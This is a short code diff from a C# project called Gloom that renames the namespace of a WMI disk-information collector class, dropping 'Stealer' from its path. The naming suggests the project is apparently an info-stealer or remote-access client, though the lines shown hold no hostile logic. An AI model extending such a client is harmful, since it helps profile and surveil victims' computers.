@@ -1,6 +1,6 @@
 ﻿using Gloom.WmiOps;
 
-namespace Gloom.Client.Features.Stealer.InfoCollector.Wmi;
+namespace Gloom.Client.Features.InfoCollector.Wmi;
 internal class WmiDiskInfo : WmiInfo
 {
 	public WmiDiskInfo() : base(WmiOpCodes.DiskInfo)
